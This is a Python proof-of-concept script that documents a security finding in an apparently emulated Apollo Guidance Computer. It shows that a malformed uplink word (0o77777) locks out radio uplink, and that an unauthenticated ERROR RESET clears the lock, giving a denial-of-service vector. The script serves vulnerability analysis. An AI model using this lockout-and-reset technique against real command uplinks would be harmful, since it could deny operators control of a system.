"""Finding 3: the uplink lockout is a DoS vector, and it is self-unlocking.

A malformed word trips TMFAIL2, which sets UPLOCKFL (bit 4 of FLAGWRD7)
and blocks further uplink.  But:

  * the lockout is trivially cleared by an unauthenticated uplinked
    ERROR RESET (ELRCODE = octal 22), tested at UPOK *before* the lock
    check, so it is honoured even while locked; and
  * an attacker who merely wants to deny Mission Control its uplink can
    hold the computer in the locked state with garbage.

Note the lockout gates only the radio.  The keyboard is unaffected --
which is what proves the block is specific to the uplink path.
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
BOOT_SETTLE = 10.0   # AGC fresh start must complete before it accepts input
from agc_link import AGC, encode_uplink_word
from p27 import verb, load, enable_display

BAD_WORD = 0o77777     # lo=37 mid=37 hi=37; mid should be ~37=00 -> fails CCC check

def vfield(agc):
    return f"{agc.g(23)}{agc.g(22)}"

agc = AGC()
agc.pump(BOOT_SETTLE)

# On cold erasable DSKYFLAG is clear, so nothing reaches the display and every
# step below would read blank whether or not the uplink worked.  Turn the
# display on first -- over the radio, like everything else here.
verb(agc, 37); load(agc, 0)
agc.pump(1.5)
enable_display(agc, log=lambda s: None)
agc.pump(1.5)

print("1. uplink VERB 1 6      (well-formed -- should be accepted)")
for k in ("VERB", "1", "6"):
    agc.uplink(k)
print(f"   VERB field = {vfield(agc)}\n")

print(f"2. uplink malformed word {BAD_WORD:05o}  (fails triple-redundancy -> TMFAIL2)")
agc.uplink_raw(BAD_WORD)
agc.pump(1.0)
print(f"   VERB field = {vfield(agc)}\n")

print("3. uplink VERB 2 1      (should now be IGNORED -- UPLOCKFL set)")
for k in ("VERB", "2", "1"):
    agc.uplink(k)
print(f"   VERB field = {vfield(agc)}   <- unchanged means uplink is locked out\n")

print("4. KEYBOARD VERB 2 1    (same keystrokes, physical panel)")
for k in ("VERB", "2", "1"):
    agc.keypress(k)
print(f"   VERB field = {vfield(agc)}   <- keyboard still works; block is uplink-specific\n")

print("5. uplink ERROR RESET   (ELRCODE octal 22 -- unauthenticated, clears the lock)")
agc.uplink("RSET")
agc.pump(1.0)

print("6. uplink VERB 3 5      (uplink restored?)")
for k in ("VERB", "3", "5"):
    agc.uplink(k)
print(f"   VERB field = {vfield(agc)}   <- changed means the attacker unlocked themselves")
